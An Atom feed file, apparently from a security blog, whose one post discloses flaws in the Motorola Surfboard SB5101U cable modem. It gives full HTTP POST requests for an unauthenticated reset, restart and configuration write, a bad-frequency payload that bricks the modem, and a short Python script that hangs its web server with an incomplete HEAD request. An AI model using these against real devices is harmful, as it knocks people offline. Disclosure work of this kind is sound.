@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: modem | forelsec]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/modem/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2014-03-03T23:18:38-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Motorola Surfboard - Multiple Vulnerabilities]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities/"/>
+    <updated>2013-04-21T00:06:45-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities</id>
+    <content type="html"><![CDATA[<p>It would appear that these vulnerabilities were disclosed a few years ago (<a href="http://www.cvedetails.com/cve/CVE-2008-2002/">CVE-2008-2002</a> and <a href="http://www.cvedetails.com/cve/CVE-2006-5196/">CVE-2006-5196</a>), but my relatively new (1-2 years) Motorola Surfboard SB5101U (verified against both the 101 and 101U), loaded with SB5101NU-2.1.7.0-GA-00-388-NOSH, appears to be vulnerable to the same CSRF&rsquo;s exposed prior.  With no authentication system in place at all, it would appear that a local DoS is not much of a concern to them.  It&rsquo;s interesting that, despite the sudden flood of discovered vulnerabilities in routers, nobody is really taking a look at the other piece of hardware between you and the ISP.  As I poked about this modem, I discovered a few other interesting things.</p>
+
+<p>First, here&rsquo;s the POST to reset the modem to factory defaults:</p>
+
+<p>```
+POST /goform/RgConfig HTTP/1.1
+Host: 192.168.100.1
+Proxy-Connection: keep-alive
+Content-Length: 34
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Origin: <a href="http://192.168.100.1">http://192.168.100.1</a>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
+Content-Type: application/x-www-form-urlencoded
+Referer: <a href="http://192.168.100.1/RgConfig.asp">http://192.168.100.1/RgConfig.asp</a>
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</p>
+
+<p>RestoreFactoryDefault=1&amp;ResetReq=0
+```</p>
+
+<p>And the POST for restarting the modem:</p>
+
+<p>```
+POST /goform/RgConfig HTTP/1.1
+Host: 192.168.100.1
+Proxy-Connection: keep-alive
+Content-Length: 34
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Origin: <a href="http://192.168.100.1">http://192.168.100.1</a>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
+Content-Type: application/x-www-form-urlencoded
+Referer: <a href="http://192.168.100.1/RgConfig.asp">http://192.168.100.1/RgConfig.asp</a>
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</p>
+
+<p>RestoreFactoryDefault=0&amp;ResetReq=1
+```</p>
+
+<p>This page also appears to allow the user the ability to modify modem settings by intercepting the response and modifying a javascript flag:</p>
+
+<p><img class="center <a" src="href="http://3.bp.blogspot.com/-SJ6LsHU8-28/UVeuZzI105I/AAAAAAAAAcM/5T3qv2jygZI/s640/config_mod.jpg">http://3.bp.blogspot.com/-SJ6LsHU8-28/UVeuZzI105I/AAAAAAAAAcM/5T3qv2jygZI/s640/config_mod.jpg</a>"></p>
+
+<p>Once we flip the flag var from 1 to 0, we have write access via the web interface.  The write POST is as follows:</p>
+
+<p>```
+POST /goform/RgConfig HTTP/1.1
+Host: 192.168.100.1
+Proxy-Connection: keep-alive
+Content-Length: 125
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Origin: <a href="http://192.168.100.1">http://192.168.100.1</a>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
+Content-Type: application/x-www-form-urlencoded
+Referer: <a href="http://192.168.100.1/RgConfig.asp">http://192.168.100.1/RgConfig.asp</a>
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</p>
+
+<p>CmFrequencyPlan=0&amp;CmUpChannelId=1&amp;CmDownstreamFreq=843000000&amp;CmDhcpServer=on&amp;saveChanges=1&amp;RestoreFactoryDefault=0&amp;ResetReq=0
+```</p>
+
+<p>With this we can totally brick the device (that is, until someone figures all this out) by modifying the stream frequency as follows:</p>
+
+<p><code>
+CmFrequencyPlan=0&amp;CmUpChannelId=0&amp;CmDownstreamFreq=-843000000&amp;CmDhcpServer=on&amp;saveChanges=1&amp;RestoreFactoryDefault=0&amp;ResetReq=0
+</code></p>
+
+<p>This can be fixed by simply restoring the configuration to the factory default through the web interface.  However: with an incomplete HTTP HEAD request, we can completely DoS the web server rendering any attempt to access it from the local network moot.  The code:</p>
+
+<p>```
+import socket</p>
+
+<p>request = &lsquo;HEAD / HTTP/1.1\r\n&rsquo;\</p>
+
+<pre><code>      'Connection: Keep-Alive\r\n'\
+      'Content-Length: 50\r\n'\
+      'Host: 192.168.100.1\r\n\r\n'
+</code></pre>
+
+<p>try:</p>
+
+<pre><code>sock = socket.socket()
+sock.connect(('192.168.100.1', 80))
+sock.send(request)
+print 'Holding the flag...'
+data = sock.recv(1024)
+</code></pre>
+
+<p>except Exception, e: print e
+except KeyboardInterrupt: sock.close()
+```</p>
+
+<p>Because the web server does not have the entire request, it waits for it in another packet.  Which, of course, never arrives.  We can test this by removing the Content-Length field, which will automatically then close the socket.  Between these two vulnerabilities, the modem is essentially rendered useless until hard booted.</p>
+]]></content>
+  </entry>
+  
+</feed>
